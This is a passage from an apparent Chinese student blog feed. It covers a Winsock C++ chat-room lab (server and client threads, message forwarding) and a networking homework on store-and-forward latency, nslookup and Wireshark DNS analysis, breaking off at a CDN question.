class="hljs-built_in">print_toggle</span>(INFO, new_client,<span class="hljs-built_in">get_time_str</span>());                <span class="hljs-comment">// broadcast</span>                <span class="hljs-type">char</span> msg[MSG_SIZE];                <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; TXT_SIZE; j++)                    msg[j + TXT_PTR] = new_client.<span class="hljs-built_in">c_str</span>()[j];                msg[<span class="hljs-number">0</span>] = NEW_C;                <span class="hljs-comment">//add time</span>                <span class="hljs-type">char</span> time[TIME_SIZE];                <span class="hljs-built_in">strcpy</span>(time, <span class="hljs-built_in">get_time_str</span>().<span class="hljs-built_in">c_str</span>());                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; TIME_SIZE; j++)                    msg[j + TIME_PTR] = time[j];                <span class="hljs-built_in">broadcast</span>(msg, id);                <span class="hljs-keyword">break</span>;            } <span class="hljs-keyword">else</span> {                <span class="hljs-built_in">send</span>(sock_connects[index], DUL, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);            }        }        HANDLE h_thread_c=<span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, handle_msg, (LPVOID) &amp;sock_connects[index], <span class="hljs-number">0</span>, <span class="hljs-literal">nullptr</span>);        <span class="hljs-built_in">CloseHandle</span>(h_thread_c);        string online = <span class="hljs-string">"online: "</span> + <span class="hljs-built_in">to_string</span>(username_map.<span class="hljs-built_in">size</span>());        <span class="hljs-built_in">print_toggle</span>(INFO, online,<span class="hljs-built_in">get_time_str</span>());    }}</code></pre></div></div><h4 id="消息转发线程">消息转发线程</h4><p>消息转发线程主要根据收到的报文控制段对消息进行不同的处理并转发。同时在服务器端输出日志，如下图所示。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C%E4%B8%80_socket%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F/20230828210345322153_660_20221026193803523871_125_image-20221022225008715.png" alt="image-20221022225008715"><figcaption aria-hidden="true">image-20221022225008715</figcaption></figure><p>在程序中除了根据姓名找<code>socket id</code>,也常常出现反着找的情况。</p><p>这一部分需要注意的点是在<code>PRI_C</code>即私密聊天情况下，如果客户端给出的姓名不在当前上线用户的范围之内，会单独给发送者提示。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-53t7btlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-53t7btlluwpkzv"><pre><code class="hljs c++"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">handle_msg</span><span class="hljs-params">(LPVOID lparam)</span> </span>{    <span class="hljs-keyword">auto</span> *socket = (SOCKET *) lparam;    <span class="hljs-type">int</span> id = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CLIENT; i++) {        <span class="hljs-keyword">if</span> (sock_connects[i] == *socket) {            id = i;            <span class="hljs-keyword">break</span>;        }    }    <span class="hljs-comment">// listen to the message from the client</span>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-type">char</span> from_user[NAME_SIZE];        <span class="hljs-type">char</span> msg[MSG_SIZE];        <span class="hljs-type">char</span> content[TXT_SIZE];        <span class="hljs-built_in">memset</span>(from_user, <span class="hljs-number">0</span>, NAME_SIZE);        <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);        <span class="hljs-built_in">memset</span>(content, <span class="hljs-number">0</span>, TXT_SIZE);        <span class="hljs-type">int</span> ret = <span class="hljs-built_in">recv</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);        <span class="hljs-keyword">if</span> (ret == SOCKET_ERROR) {            <span class="hljs-built_in">print_toggle</span>(WARN, <span class="hljs-string">"client closed unexpectedly"</span>);            <span class="hljs-built_in">closesocket</span>(*socket);            <span class="hljs-comment">//remove the socket from the list</span>            sock_connects[id] = INVALID_SOCKET;            <span class="hljs-comment">//remove the username from the ma according to the id</span>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> it = username_map.<span class="hljs-built_in">begin</span>(); it != username_map.<span class="hljs-built_in">end</span>(); it++) {                <span class="hljs-keyword">if</span> (it-&gt;second == id) {                    username_map.<span class="hljs-built_in">erase</span>(it);                    <span class="hljs-keyword">break</span>;                }            }            <span class="hljs-keyword">break</span>;        }        <span class="hljs-type">char</span> type = msg[<span class="hljs-number">0</span>];        <span class="hljs-comment">//get the username from the map</span>        string username;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> &amp;item: username_map) {            <span class="hljs-keyword">if</span> (item.second == id) {                username = item.first;                <span class="hljs-keyword">break</span>;            }        }        <span class="hljs-keyword">switch</span> (type) {            <span class="hljs-keyword">case</span> QUIT_C: {                <span class="hljs-comment">// close client through the client's receive thread</span>                <span class="hljs-type">char</span> msg_exit[MSG_SIZE];                <span class="hljs-built_in">memset</span>(msg_exit, <span class="hljs-number">0</span>, MSG_SIZE);                msg_exit[<span class="hljs-number">0</span>] = EXIT_C;                string exit_msg =<span class="hljs-string">"you have been moved out of the chat room"</span>;                <span class="hljs-built_in">send</span>(*socket, msg_exit, MSG_SIZE, <span class="hljs-number">0</span>);                <span class="hljs-built_in">closesocket</span>(*socket);                sock_connects[id] = <span class="hljs-number">0</span>;                username_map.<span class="hljs-built_in">erase</span>(username);                string gone_saying = username + <span class="hljs-string">" has quit the chat room at "</span>;                <span class="hljs-built_in">print_message</span>(GONE, gone_saying,<span class="hljs-built_in">get_time_str</span>());                <span class="hljs-comment">//broadcast the quit message</span>                <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> sock_connect: sock_connects) {                    <span class="hljs-keyword">if</span> (sock_connect != <span class="hljs-number">0</span>) {                        <span class="hljs-comment">// attach the content to the message</span>                        <span class="hljs-type">char</span> msg_forwards[MSG_SIZE];                        <span class="hljs-built_in">memset</span>(msg_forwards, <span class="hljs-number">0</span>, MSG_SIZE);                        msg_forwards[<span class="hljs-number">0</span>] = QUIT_C;                        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++) {                            msg_forwards[TXT_PTR + i] = gone_saying[i];                        }                    }                }                <span class="hljs-keyword">break</span>;            }            <span class="hljs-keyword">case</span> PUB_C: {                <span class="hljs-comment">//get the username from the map</span>                string info=<span class="hljs-string">"received a public message from "</span>;                info+=username;                <span class="hljs-built_in">print_toggle</span>(LOG, info,<span class="hljs-built_in">get_time_str</span>());                <span class="hljs-built_in">broadcast</span>(msg, id);                <span class="hljs-keyword">break</span>;            }            <span class="hljs-keyword">case</span> PRI_C: {                <span class="hljs-comment">//get the username from the map</span>                string info=<span class="hljs-string">"received a public message from "</span>;                info+=username;                <span class="hljs-built_in">print_toggle</span>(LOG, info,<span class="hljs-built_in">get_time_str</span>());                <span class="hljs-comment">//get the target user</span>                <span class="hljs-type">char</span> target_user[NAME_SIZE];                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++) {                    target_user[i] = msg[NAME_PTR + i];                }                <span class="hljs-function">string <span class="hljs-title">target_user_s</span><span class="hljs-params">(target_user)</span></span>;                <span class="hljs-comment">//check if the target user is online</span>                <span class="hljs-keyword">if</span> (username_map.<span class="hljs-built_in">find</span>(target_user) == username_map.<span class="hljs-built_in">end</span>()) {                    <span class="hljs-comment">//target user is not online</span>                    <span class="hljs-comment">// show log on the server</span>                    string error_msg = <span class="hljs-string">"the target user "</span>;                    error_msg.<span class="hljs-built_in">append</span>(target_user);                    error_msg.<span class="hljs-built_in">append</span>(<span class="hljs-string">" provided by "</span>);                    error_msg.<span class="hljs-built_in">append</span>(username);                    error_msg.<span class="hljs-built_in">append</span>(<span class="hljs-string">" is not online!"</span>);                    <span class="hljs-built_in">print_message</span>(LOG, error_msg);                    <span class="hljs-comment">//send the error message to the sender</span>                    <span class="hljs-type">char</span> msg_error[MSG_SIZE];                    <span class="hljs-built_in">memset</span>(msg_error, <span class="hljs-number">0</span>, MSG_SIZE);                    msg_error[<span class="hljs-number">0</span>] = ERR_C;                    string ree_msg_to_send = target_user_s + <span class="hljs-string">" is not online!"</span>;                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++) {                        msg_error[TXT_PTR + i] = error_msg[i];                    }                    <span class="hljs-built_in">send</span>(*socket, msg_error, MSG_SIZE, <span class="hljs-number">0</span>);                } <span class="hljs-keyword">else</span> {                    string info_pri=<span class="hljs-string">"received a private message from "</span>;                    info_pri+=username;                    <span class="hljs-built_in">print_toggle</span>(LOG, info_pri,<span class="hljs-built_in">get_time_str</span>());                    <span class="hljs-comment">//target user is online</span>                    <span class="hljs-comment">//send the message to the target user</span>                    <span class="hljs-type">int</span> target_id = username_map[target_user];                    <span class="hljs-comment">// replace the target user's name with the sender's name</span>                    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++) {                        msg[NAME_PTR + i] = username[i];                    }                    <span class="hljs-built_in">send</span>(sock_connects[target_id], msg, MSG_SIZE, <span class="hljs-number">0</span>);                }                <span class="hljs-keyword">break</span>;            }        }    }}</code></pre></div></div><h3 id="客户端进程">客户端进程</h3><h4 id="主线程-1">主线程</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ofnkb2lluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-ofnkb2lluwpkzv"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">connect</span>(sockClient, (SOCKADDR *) &amp;addrSrv, <span class="hljs-built_in">sizeof</span>(SOCKADDR)) != <span class="hljs-number">0</span>) {    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"connect failed"</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;}<span class="hljs-built_in">print_toggle</span>(SUC, <span class="hljs-string">"connect success"</span>, <span class="hljs-built_in">get_time_str</span>());<span class="hljs-comment">// send username</span><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {    <span class="hljs-built_in">print_toggle</span>(SERVER, <span class="hljs-string">"please input your username:"</span>, <span class="hljs-built_in">get_time_str</span>());    cin &gt;&gt; user_name;    <span class="hljs-comment">// check if the name is "all" or "quit" that may cause conflict</span>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(user_name, <span class="hljs-string">"all"</span>) == <span class="hljs-number">0</span> || <span class="hljs-built_in">strcmp</span>(user_name, <span class="hljs-string">"quit"</span>) == <span class="hljs-number">0</span>) {        <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"the username cannot be set to system reserved words"</span>);        <span class="hljs-keyword">continue</span>;    }    <span class="hljs-built_in">send</span>(sockClient, user_name, NAME_SIZE, <span class="hljs-number">0</span>);    <span class="hljs-comment">//it must be a buffer, although it is only a char</span>    <span class="hljs-type">char</span> status[<span class="hljs-number">1</span>];    <span class="hljs-built_in">recv</span>(sockClient, status, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> (status[<span class="hljs-number">0</span>] == HELLO_C) {        <span class="hljs-built_in">print_toggle</span>(SUC, <span class="hljs-string">"welcome to the chat room!"</span>);        <span class="hljs-keyword">break</span>;    }    <span class="hljs-built_in">print_toggle</span>(ERR, <span class="hljs-string">"the username has been used, please input another one"</span>);}HANDLE h_thread[<span class="hljs-number">2</span>];<span class="hljs-comment">// separate the sending and receiving thread to avoid blocking</span>h_thread[<span class="hljs-number">0</span>] = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, handlerRec, (LPVOID) &amp;sockClient, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);h_thread[<span class="hljs-number">1</span>] = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, handlerSend, (LPVOID) &amp;sockClient, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<span class="hljs-built_in">WaitForMultipleObjects</span>(<span class="hljs-number">2</span>, h_thread, TRUE, INFINITE);<span class="hljs-built_in">CloseHandle</span>(h_thread[<span class="hljs-number">0</span>]);<span class="hljs-built_in">CloseHandle</span>(h_thread[<span class="hljs-number">1</span>]);<span class="hljs-built_in">closesocket</span>(sockClient);<span class="hljs-built_in">WSACleanup</span>();<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</code></pre></div></div><p>这一部分进行了用户信息发送以及创建了两个子线程用于发送和收取来自服务器的消息。之后阻塞等待线程结束。</p><h4 id="发送线程">发送线程</h4><p>首先将报文字段进行初始化，以便根据实际情况填入。循环等待用户输入，并在过程中两次检查是否需要退出。之后根据报文的控制段<code>TYPE</code>分别构建不同格式信息。注意在这一阶段并不是程报文中的每一个字段都一定用的到。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-aptxc2lluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-aptxc2lluwpkzv"><pre><code class="hljs c++"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">handlerSend</span><span class="hljs-params">(LPVOID lparam)</span> </span>{    <span class="hljs-keyword">auto</span> *socket = (SOCKET *) lparam;    <span class="hljs-type">char</span> to_user[NAME_SIZE];    <span class="hljs-type">char</span> msg[MSG_SIZE];    <span class="hljs-type">char</span> saying[TXT_SIZE];    <span class="hljs-built_in">memset</span>(to_user, <span class="hljs-number">0</span>, NAME_SIZE);    <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);    <span class="hljs-built_in">memset</span>(saying, <span class="hljs-number">0</span>, TXT_SIZE);    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-built_in">print_toggle</span>(TIP, <span class="hljs-string">"please input \"user message\", input 'all' to send to all users"</span>);        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%s"</span>, to_user);        <span class="hljs-comment">// if nothing is input, then continue to ask for input again</span>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(to_user) == <span class="hljs-number">0</span>) {            cout&lt;&lt;<span class="hljs-string">"please input something"</span>&lt;&lt;endl;            <span class="hljs-keyword">continue</span>;        }        <span class="hljs-comment">//check quit</span>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(to_user, <span class="hljs-string">"quit"</span>) == <span class="hljs-number">0</span>) {            <span class="hljs-built_in">print_toggle</span>(TIP, <span class="hljs-string">"you chose to quit the chat room"</span>);            <span class="hljs-comment">//send quit message to server</span>            msg[<span class="hljs-number">0</span>] = QUIT_C;            <span class="hljs-built_in">send</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        }        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">"%[^\n]"</span>, saying);        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(saying) == <span class="hljs-number">0</span>){            <span class="hljs-keyword">continue</span>;        }        <span class="hljs-comment">//check quit</span>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(saying, <span class="hljs-string">"quit"</span>) == <span class="hljs-number">0</span>) {            <span class="hljs-built_in">print_toggle</span>(TIP, <span class="hljs-string">"you have quit the chat room"</span>);            <span class="hljs-comment">//send quit message to server</span>            msg[<span class="hljs-number">0</span>] = QUIT_C;            <span class="hljs-built_in">send</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        }        <span class="hljs-comment">//send message to server for forwarding</span>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(to_user, <span class="hljs-string">"all"</span>) == <span class="hljs-number">0</span>){            msg[<span class="hljs-number">0</span>] = PUB_C;            <span class="hljs-comment">//construct the message</span>            <span class="hljs-comment">//content</span>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++){                msg[i + TXT_PTR] = saying[i];            }            <span class="hljs-comment">// from user</span>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++){                msg[i + NAME_PTR] = user_name[i];            }            <span class="hljs-comment">//time stamp</span>            string time_stamp = <span class="hljs-built_in">get_time_str</span>();            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TIME_SIZE; i++){                msg[i + TIME_PTR] = time_stamp[i];            }            <span class="hljs-built_in">send</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);        }<span class="hljs-keyword">else</span>{            msg[<span class="hljs-number">0</span>] = PRI_C;            <span class="hljs-comment">//construct the message</span>            <span class="hljs-comment">//content</span>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++){                msg[i + TXT_PTR] = saying[i];            }            <span class="hljs-comment">// to user</span>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++){                msg[i + NAME_PTR] = to_user[i];            }            <span class="hljs-comment">//time stamp</span>            string time_stamp = <span class="hljs-built_in">get_time_str</span>();            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TIME_SIZE; i++){                msg[i + TIME_PTR] = time_stamp[i];            }            <span class="hljs-built_in">send</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);        }    }}</code></pre></div></div><h4 id="接收线程">接收线程</h4><p>接收线程是一个解析的过程，并往控制台进行不同格式输出。模式基本类似。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zxsst3lluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-zxsst3lluwpkzv"><pre><code class="hljs c++"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">handlerRec</span><span class="hljs-params">(LPVOID lparam)</span> </span>{    <span class="hljs-keyword">auto</span> *socket = (SOCKET *) lparam;    <span class="hljs-type">char</span> msg[MSG_SIZE];    <span class="hljs-built_in">memset</span>(msg, <span class="hljs-number">0</span>, MSG_SIZE);    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {        <span class="hljs-built_in">recv</span>(*socket, msg, MSG_SIZE, <span class="hljs-number">0</span>);        <span class="hljs-type">char</span> type = msg[<span class="hljs-number">0</span>];        <span class="hljs-type">char</span> content[TXT_SIZE];        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TXT_SIZE; i++)            content[i] = msg[i + TXT_PTR];        <span class="hljs-type">char</span> time[TIME_SIZE];        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TIME_SIZE; i++)            time[i] = msg[i + TIME_PTR];        <span class="hljs-keyword">switch</span> (type) {            <span class="hljs-comment">// new server message</span>            <span class="hljs-keyword">case</span> NEW_C:                <span class="hljs-built_in">print_message</span>(NEW, content);                <span class="hljs-keyword">break</span>;            <span class="hljs-comment">// typed "quit" and all resources are released, exit the program</span>            <span class="hljs-keyword">case</span> EXIT_C:                <span class="hljs-comment">// end of the program</span>                <span class="hljs-built_in">print_toggle</span>(WARN, content);                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);            <span class="hljs-comment">// public normal message</span>            <span class="hljs-keyword">case</span> PUB_C:                <span class="hljs-comment">// get the sender's name</span>                <span class="hljs-type">char</span> fromUser[NAME_SIZE];                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++)                    fromUser[i] = msg[i + NAME_PTR];                <span class="hljs-comment">// print the message</span>                <span class="hljs-built_in">print_message</span>(PUB, content, time, fromUser);                <span class="hljs-keyword">break</span>;            <span class="hljs-comment">// handle message from server</span>            <span class="hljs-keyword">case</span> SERVER_C:                <span class="hljs-comment">//get the time from the message</span>                <span class="hljs-type">char</span> time_ser[TIME_SIZE];                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TIME_SIZE; i++)                    time_ser[i] = msg[i + TIME_PTR];                <span class="hljs-built_in">print_message</span>(SERVER, content, time_ser);                <span class="hljs-keyword">break</span>;            <span class="hljs-comment">// private message</span>            <span class="hljs-keyword">case</span> PRI_C:                <span class="hljs-comment">// get the sender's name</span>                <span class="hljs-type">char</span> from_user[NAME_SIZE];                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NAME_SIZE; i++)                    from_user[i] = msg[i + NAME_PTR];                <span class="hljs-comment">// print the message</span>                <span class="hljs-built_in">print_message</span>(PRI, content, time, from_user);                <span class="hljs-keyword">break</span>;        }    }}</code></pre></div></div><h2 id="思考">思考</h2><p>在Java程序设计课上，也编写过一个聊天程序。那时只是机械的学习API，虽然也大致了解TCP，UDP的概念，但对于协议的设计还是非常朴素的。虽然本次实验的协议设计也比较简单，但随着学习的深入也会对此有更新的认识。比如很明显的一个设计缺陷是把时间放到了数据段之后。如果把数据段放到最后，可以通过增加长度字段来支持变长数据的传输。其他的比如数据校验等方面也可以继续改进。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络-书面作业1</title>
    <link href="/posts/54831/"/>
    <url>/posts/54831/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络-书面作业1">计算机网络-书面作业1</h1><p>2013599_田佳业</p><h3 id="第一章问题">第一章问题</h3><p>网络结构如下图所示，主机A与主机B之间通过两段链路和一台转发设备R进行连接，每条链路的长度和传输速率已经在图中标出，R采用存储转发机制。主机A向主机B发送一个长度为10000字节的报文，请回答以下问题（设电磁波传播速度为2*108米/秒）</p><ol type="1"><li><p>如果采用报文交换，请计算端到端的最小时延，即从主机A传输报文的第一位开始，到主机B接收到报文的最后一位为止所用的时间。</p></li><li><p>如果将报文分成5个报文分组传输，请计算完成报文传输的最小端到端时延（忽略报文分组的封装开销）。</p></li></ol><p>在统计多路复用机制中，端到端的时延具有不确定性，请简要分析影响端到端时延的主要因素。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211058424432_805_20221120095815944612_600_clip_image002.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><ol type="1"><li></li></ol><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211059236518_851_20221228103350003675_727_image-20221228093807403.png" alt="image-20221228093807403"><figcaption aria-hidden="true">image-20221228093807403</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211100678849_931_20221228103353392389_877_image-20221228095021089.png" alt="image-20221228095021089"> <span class="math display">\[\mathrm{Latency_1 = PROP + TRANSP}=\frac{(4+2)\times 10^3}{2 \times10^{8}}+\frac{10^{4} \times 8}{100\times 10^6}+\frac{10^{4} \times8}{10\times 10^6}\\=3\times 10^{-5}+8\times 10^{-4}+8\times 10^{-3}=8.83\times10^{-3}\text{s}\]</span> 可以看到传播速率主要取决于链路2的传输速度。</p><ol start="2" type="1"><li></li></ol><p><span class="math display">\[\mathrm{Latency_2} =\mathrm{Latency_1}-\frac{4}{5}\frac{10^{4} \times8}{100\times 10^6}=8.19\times 10^{-3}\text{s}\]</span> 为什么可以这么算?</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211102220231_387_20221228103355518362_356_image-20221228101441745.png" alt="image-20221228101441745"><figcaption aria-hidden="true">image-20221228101441745</figcaption></figure><p>同时也可以看出，在这个问题中，节省的时间仅取决于第一个链路的时延。因为第二条链路比较慢，所以总体上来说并没有节省太多时间。</p><p>（3）主要因素包括：</p><ul><li><p>核心：存储转发设备中的排队时延</p></li><li><p>路由器中的处理时间：路由决策、差错检验、分片等操作</p></li><li><p>报文分组大小和分组数量，数据流的个数，数据流占带宽的频率，都会影响时延。</p></li><li><p>链路的传输速率，链路长度</p></li></ul><p>排队时延是导致“不确定性“的最主要因素。</p><h3 id="第二章问题">第二章问题</h3><h6 id="section">1.</h6><p>通过使用Windows命令行模式提供的nslookup命令查询www.baidu.com的IP地址，给出结果截图，并对返回的结果进行解释。同时，利用Wireshark捕获查询的交互过程，给出结果截图，并进行简要说明。</p><ol type="1"><li></li></ol><p>nslookup命令用于<strong>查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题</strong></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211105692753_410_20221120095816836309_574_image-20221115205303473.png" alt="image-20221115205303473"><figcaption aria-hidden="true">image-20221115205303473</figcaption></figure><p>服务器为本机DNS服务器信息，Address表示的是 DNS 服务器地址。</p><p>非权威应答表示，非从域名的权威服务器获得结果，而是从本地DNS缓存中获取的结果</p><p>www.a.shifen.com是百度域名曾经的一个别名，<code>shifen.com</code>和<code>baidu.com</code>两台域服务器其实是同一台服务器。</p><p>下面的Address便是百度域名对应的ip地址。以第一个为例，搜索一下看看:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211106734346_212_20221120095817744460_340_image-20221115210510064.png" alt="image-20221115210510064"><figcaption aria-hidden="true">image-20221115210510064</figcaption></figure><ol start="2" type="1"><li></li></ol><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211107709615_845_20221120095840824680_626_image-20221115211104602.png" alt="image-20221115211104602"><figcaption aria-hidden="true">image-20221115211104602</figcaption></figure><p>输入dns进行过滤，可以看到解析百度时的报文发送和应答，对应左边灰色的箭头。</p><p>可以看出 ，DNS 为应用层协议 ，下层传输层采用 UDP ，再下层网络层是IPV4 协议 。</p><p>下面结合DNS报文格式进行分析:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211108799252_424_20221120095842598552_479_image-20221115211202585.png" alt="image-20221115211202585"><figcaption aria-hidden="true">image-20221115211202585</figcaption></figure><p>本机(10.130.93.171是WLAN的IPv4地址)首先向服务器发出查询请求 ，然后服务器解析 IP 找到主机 ，做出响应 。接着 ，主机向服务器发送查询www.baidu.com信息的对应请求，服务器接受到请求后作出响应。并且可以看到回应的报文Answers区域报文包括的内容未必是等长，格式相同的。每一个回答反映一部分需要的信息。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211110204046_677_20221120095845117430_948_image-20221115211646689.png" alt="image-20221115211646689"><figcaption aria-hidden="true">image-20221115211646689</figcaption></figure><p>资源记录结构如下所示:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E4%B9%A6%E9%9D%A2%E4%BD%9C%E4%B8%9A1/20230828211111256885_875_20221120100009402791_134_image-20221115220024906.png" alt="image-20221115220024906"><figcaption aria-hidden="true">image-20221115220024906</figcaption></figure><p>比如图中的A对应将名称对应到IPv4的32位地址。</p><h6 id="section-1">2.</h6><p>以反复解析为例，说明域名解析的基本工作过程（可以结合图例）。给出内容分发网络（CDN）中DNS重定向的基本方法，说明原始资源记录应该如何修改，并描述重定向过程。</p><p><img 